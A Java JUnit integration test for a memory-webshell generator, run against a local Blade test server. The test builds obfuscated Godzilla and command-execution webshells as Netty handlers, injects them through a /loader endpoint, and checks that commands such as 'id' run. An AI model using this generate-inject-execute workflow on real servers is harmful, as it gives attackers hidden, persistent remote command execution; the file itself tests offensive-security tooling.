package com.reajason.javaweb.blade.integration;

import com.reajason.javaweb.memshell.MemShellGenerator;
import com.reajason.javaweb.memshell.MemShellResult;
import com.reajason.javaweb.memshell.PluginBootstrap;
import com.reajason.javaweb.memshell.PluginValidationReport;
import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ObfuscationConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.config.ShellToolConfig;
import com.reajason.javaweb.memshell.shelltool.command.CommandConfig;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaConfig;
import net.bytebuddy.jar.asm.Opcodes;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import org.junit.jupiter.api.AfterAll;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.MethodOrderer;
import org.junit.jupiter.api.Order;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.TestInstance;
import org.junit.jupiter.api.TestMethodOrder;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.util.Base64;
import java.util.UUID;
import java.util.concurrent.TimeUnit;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.junit.jupiter.api.Assertions.fail;

@TestInstance(TestInstance.Lifecycle.PER_CLASS)
@TestMethodOrder(MethodOrderer.OrderAnnotation.class)
class BladeMemShellIntegrationTest {

    private static final String SERVER = "Blade";

    private final OkHttpClient http = new OkHttpClient();
    private final StringBuffer rangeOutput = new StringBuffer();

    private Process range;
    private int port;
    private String base;

    @BeforeAll
    void startRange() throws Exception {
        String pluginsDir = System.getProperty("memshell.plugins.dir");
        assertNotNull(pluginsDir, "memshell.plugins.dir is not set");
        assertTrue(new File(pluginsDir).isDirectory(), "plugin directory does not exist: " + pluginsDir);

        String rangeJar = System.getProperty("blade.range.jar");
        assertNotNull(rangeJar, "blade.range.jar is not set");
        assertTrue(new File(rangeJar).isFile(), "range jar does not exist: " + rangeJar);

        PluginBootstrap.load();

        PluginValidationReport report = PluginBootstrap.validate(Path.of(pluginsDir));
        report.getWarnings().forEach(warning -> System.out.println("[plugin warning] " + warning));
        assertTrue(report.isValid(), "plugin validation failed: " + report.getErrors());

        port = freePort();
        base = "http://127.0.0.1:" + port;
        ProcessBuilder builder = new ProcessBuilder(
                System.getProperty("java.home") + "/bin/java",
                "--add-opens", "java.base/java.lang=ALL-UNNAMED",
                "--add-opens", "jdk.unsupported/sun.misc=ALL-UNNAMED",
                "-jar", rangeJar, String.valueOf(port));
        builder.redirectErrorStream(true);
        range = builder.start();

        Thread drain = new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(range.getInputStream(), StandardCharsets.UTF_8))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    rangeOutput.append(line).append('\n');
                }
            } catch (IOException ignored) {
            }
        });
        drain.setDaemon(true);
        drain.start();

        if (!waitForHealth(TimeUnit.SECONDS.toMillis(30))) {
            String log = rangeOutput.toString();
            range.destroyForcibly();
            fail("Blade range did not become healthy on port " + port + "\n" + log);
        }
    }

    @AfterAll
    void stopRange() throws Exception {
        if (range == null) {
            return;
        }
        range.destroy();
        if (!range.waitFor(10, TimeUnit.SECONDS)) {
            range.destroyForcibly();
        }
    }

    @Test
    @Order(1)
    void pluginIsDiscovered() {
        assertNotNull(PluginBootstrap.getLastResult(), "PluginBootstrap.load() did not run");

        MemShellGenerator generator = new MemShellGenerator();
        assertTrue(generator.getSupportedServers().contains(SERVER),
                "Blade server was not discovered, servers: " + generator.getSupportedServers());

        assertTrue(generator.getServer(SERVER).getSupportedShellTypes(ShellTool.Godzilla).contains(ShellType.NETTY_HANDLER),
                "Blade does not advertise the Godzilla NettyHandler shell type");
        assertTrue(generator.getServer(SERVER).getSupportedShellTypes(ShellTool.Command).contains(ShellType.NETTY_HANDLER),
                "Blade does not advertise the Command NettyHandler shell type");

        assertEquals(Opcodes.V1_8, generator.getServer(SERVER).getMinimumTargetJreVersion(),
                "Blade must not emit classes below Java 8");
        assertEquals("com.hellokaton.blade.mvc.handler", generator.getServer(SERVER).getShellPackageName(SERVER),
                "Blade does not use a Blade package for generated shell classes");
    }

    @Test
    @Order(2)
    void generatedShellUsesBladePackageAndMinimumJre() {
        ShellConfig shellConfig = ShellConfig.builder()
                .server(SERVER)
                .shellTool(ShellTool.Command)
                .shellType(ShellType.NETTY_HANDLER)
                .targetJreVersion(Opcodes.V1_6)
                .byPassJavaModule(false)
                .debug(true)
                .shrink(true)
                .lambdaSuffix(false)
                .obfuscation(ObfuscationConfig.defaults())
                .build();
        CommandConfig toolConfig = CommandConfig.builder().paramName("versionProbe").build();

        MemShellResult result = new MemShellGenerator().generate(
                shellConfig, InjectorConfig.builder().build(), toolConfig);

        assertEquals(Opcodes.V1_8, result.getShellConfig().getTargetJreVersion(),
                "Blade did not raise a Java 6 request to its Java 8 minimum");
        assertTrue(result.getShellClassName().startsWith("com.hellokaton.blade.mvc.handler."),
                "unexpected shell class name: " + result.getShellClassName());

        byte[] shellBytes = result.getShellBytes();
        int majorVersion = ((shellBytes[6] & 0xff) << 8) | (shellBytes[7] & 0xff);
        assertEquals(Opcodes.V1_8, majorVersion, "shell class was not written as Java 8 bytecode");
    }

    @Test
    @Order(3)
    void godzillaNettyHandlerExecutesCommands() throws Exception {
        GodzillaConfig godzillaConfig = GodzillaConfig.builder().build();

        String before = httpGet(base + "/hello?" + godzillaConfig.getPass() + "=x");
        assertFalse(before.contains("uid="), "Godzilla request executed before injection, response: " + before);

        MemShellResult result = generate(ShellTool.Godzilla, godzillaConfig);
        inject(result);

        GodzillaClient client = new GodzillaClient(
                base + "/hello",
                godzillaConfig.getPass(),
                godzillaConfig.getKey(),
                godzillaConfig.getHeaderName(),
                godzillaConfig.getHeaderValue());
        try {
            client.start();
            assertTrue(client.test(), "Godzilla test failed");

            String output = client.execCommand("id");
            assertTrue(output.contains("uid="), "Godzilla did not execute id, output: " + output);
        } finally {
            client.close();
        }
    }

    @Test
    @Order(4)
    void commandNettyHandlerExecutesCommands() throws Exception {
        String paramName = "bladeCmd" + UUID.randomUUID().toString().replace("-", "");
        CommandConfig commandConfig = CommandConfig.builder().paramName(paramName).build();

        String before = httpGet(base + "/hello?" + paramName + "=id");
        assertFalse(before.contains("uid="), "Command request executed before injection, response: " + before);

        MemShellResult result = generate(ShellTool.Command, commandConfig);
        inject(result);

        OkHttpClient client = new OkHttpClient();
        Request request = new Request.Builder().url(base + "/hello?" + paramName + "=id").get().build();
        try (Response response = client.newCall(request).execute()) {
            String body = response.body() != null ? response.body().string() : "";
            assertTrue(body.contains("uid="), "Command shell did not execute id, response: " + body);
        }
    }

    private MemShellResult generate(String shellTool, ShellToolConfig shellToolConfig) {
        ShellConfig shellConfig = ShellConfig.builder()
                .server(SERVER)
                .shellTool(shellTool)
                .shellType(ShellType.NETTY_HANDLER)
                .targetJreVersion(Opcodes.V1_8)
                .byPassJavaModule(false)
                .debug(true)
                .shrink(true)
                .lambdaSuffix(false)
                .obfuscation(ObfuscationConfig.defaults())
                .build();
        InjectorConfig injectorConfig = InjectorConfig.builder().staticInitialize(true).build();
        return new MemShellGenerator().generate(shellConfig, injectorConfig, shellToolConfig);
    }

    private void inject(MemShellResult result) throws IOException {
        String body = Base64.getEncoder().encodeToString(result.getInjectorBytes());
        Request request = new Request.Builder()
                .url(base + "/loader")
                .post(RequestBody.create(body, MediaType.parse("text/plain")))
                .build();
        try (Response response = http.newCall(request).execute()) {
            String text = response.body() != null ? response.body().string() : "";
            assertEquals(200, response.code(), "injection failed: " + text);
            assertTrue(text.contains("ok"), "unexpected injection response: " + text);
        }
    }

    private String httpGet(String url) throws IOException {
        Request request = new Request.Builder().url(url).get().build();
        try (Response response = http.newCall(request).execute()) {
            return response.body() != null ? response.body().string() : "";
        }
    }

    private boolean waitForHealth(long timeoutMillis) {
        long deadline = System.currentTimeMillis() + timeoutMillis;
        while (System.currentTimeMillis() < deadline) {
            if (!range.isAlive()) {
                return false;
            }
            try (Response response = http.newCall(
                    new Request.Builder().url(base + "/health").get().build()).execute()) {
                if (response.isSuccessful() && response.body() != null
                        && "ok".equals(response.body().string().trim())) {
                    return true;
                }
            } catch (IOException ignored) {
            }
            try {
                Thread.sleep(250);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return false;
            }
        }
        return false;
    }

    private static int freePort() throws IOException {
        try (ServerSocket socket = new ServerSocket(0)) {
            return socket.getLocalPort();
        }
    }
}
